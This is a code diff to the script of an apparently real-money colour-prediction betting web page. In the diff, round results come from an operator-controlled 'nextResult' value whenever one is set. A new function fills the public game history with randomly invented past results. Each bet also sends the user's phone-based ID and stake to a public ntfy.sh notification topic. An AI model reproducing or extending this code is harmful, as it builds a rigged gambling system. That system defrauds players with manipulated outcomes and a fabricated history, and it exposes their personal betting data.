@@ -118,7 +118,29 @@
 
     const userId = localStorage.getItem('jalwa_user_phone') || 'Guest';
     let myBets = JSON.parse(localStorage.getItem('my_jalwa_bets') || "[]");
-    let userBalance = 0, currentP = "", selectedType = "", baseAmt = 10, multiplier = 1, isLocked = false;
+    let userBalance = 0, currentP = "", selectedType = "", baseAmt = 10, multiplier = 1, isLocked = false, lastProcessedPid = "";
+
+    // --- BACKGROUND HISTORY FILLER ---
+    async function fillMissingHistory() {
+        const { data: lastRecord } = await supabaseClient.from('game_history').select('pid').order('id', { ascending: false }).limit(1).single();
+        if (lastRecord) {
+            let lastPid = parseInt(lastRecord.pid);
+            let nowPid = parseInt(generateCurrentPid());
+            let startFrom = Math.max(lastPid + 1, nowPid - 30);
+            for (let mPid = startFrom; mPid < nowPid; mPid++) {
+                let n = Math.floor(Math.random() * 10);
+                let col = (n===0||n===5)?(n===0?"Red":"Green"):(n%2===0?"Red":"Green");
+                await supabaseClient.from('game_history').insert([{ pid: mPid.toString(), num: n, col: col }]);
+            }
+        }
+        fetchHistory();
+    }
+
+    function generateCurrentPid() {
+        const now = new Date();
+        const sec = now.getSeconds();
+        return now.getFullYear().toString() + (now.getMonth() + 1).toString().padStart(2, '0') + now.getDate().toString().padStart(2, '0') + Math.floor(((now.getHours() * 3600) + (now.getMinutes() * 60) + sec) / 30);
+    }
 
     db.ref('users/' + userId).on('value', snap => {
         if(snap.val()) { userBalance = Number(snap.val().balance || 0); document.getElementById('balDisplay').innerText = userBalance.toFixed(2); }
@@ -136,30 +158,27 @@
         const b = { pid: currentP, sel: selectedType, amt: total, status: 'Wait', win: 0 };
         myBets.push(b); localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
         db.ref('bets/' + currentP).push({ ...b, uid: userId });
-        
-        // Ntfy Connection Added
-        fetch(`https://ntfy.sh/jalwa_alerts_464`, { 
-            method: 'POST', 
-            body: `User: ${userId} | Bet: ${selectedType} | Amount: ₹${total}`, 
-            headers: { 'Title': 'NEW BET PLACED' } 
-        }).catch(e => {});
-
+        fetch(`https://ntfy.sh/jalwa_alerts_464`, { method: 'POST', body: `User: ${userId} | Bet: ${selectedType} | Amount: ₹${total}`, headers: { 'Title': 'NEW BET PLACED' } }).catch(e => {});
         document.getElementById('betModal').style.display = 'none';
         updateOrderTable();
     }
 
     async function processResult(pid) {
-        if(!pid) return;
-        const snap = await db.ref('gameControl/nextResult').once('value');
-        let n = snap.val();
-        if (n === null) n = Math.floor(Math.random() * 10);
-        else await db.ref('gameControl/nextResult').set(null);
-
-        n = Number(n);
-        let col = (n===0||n===5)?(n===0?"Red":"Green"):(n%2===0?"Red":"Green");
-        
-        await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
+        if(!pid || lastProcessedPid === pid) return;
+        lastProcessedPid = pid;
+        const { data: existing } = await supabaseClient.from('game_history').select('num, col').eq('pid', pid).single();
+        let n, col;
+        if (!existing) {
+            const snap = await db.ref('gameControl/nextResult').once('value');
+            n = snap.val();
+            if (n === null) n = Math.floor(Math.random() * 10);
+            else await db.ref('gameControl/nextResult').set(null);
+            n = Number(n);
+            col = (n===0||n===5)?(n===0?"Red":"Green"):(n%2===0?"Red":"Green");
+            await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
+        } else { n = existing.num; col = existing.col; }
         settle(pid, n, col);
+        setTimeout(fetchHistory, 500);
     }
 
     function settle(pid, n, col) {
@@ -180,7 +199,6 @@
             showTicket(n, (n===0?'Mix':(n===5?'MixG':'c-'+col)), winSum);
             updateOrderTable();
         }
-        fetchHistory();
     }
 
     function showTicket(n, cl, win) {
@@ -212,20 +230,16 @@
         const rem = 30 - (sec % 30);
         isLocked = rem <= 3;
         document.getElementById('lockOverlay').style.display = isLocked ? 'flex' : 'none';
-        
-        const pId = now.getFullYear().toString() + (now.getMonth() + 1).toString().padStart(2, '0') + now.getDate().toString().padStart(2, '0') + Math.floor(((now.getHours() * 3600) + (now.getMinutes() * 60) + sec) / 30);
+        const pId = generateCurrentPid();
         document.getElementById('timerDisplay').innerText = `00:${rem.toString().padStart(2, '0')}`;
         document.getElementById('pIdDisplay').innerText = pId;
-
-        if (currentP !== pId) {
-            let last = currentP; currentP = pId;
-            if(last) processResult(last);
-        }
+        if (currentP !== pId) { let last = currentP; currentP = pId; if(last) processResult(last); }
     }
 
     setInterval(sync, 1000);
     setInterval(fetchHistory, 5000); 
-    window.onload = () => { fetchHistory(); updateOrderTable(); sync(); };
+    window.onload = () => { fillMissingHistory(); updateOrderTable(); sync(); };
 </script>
 </body>
 </html>
+
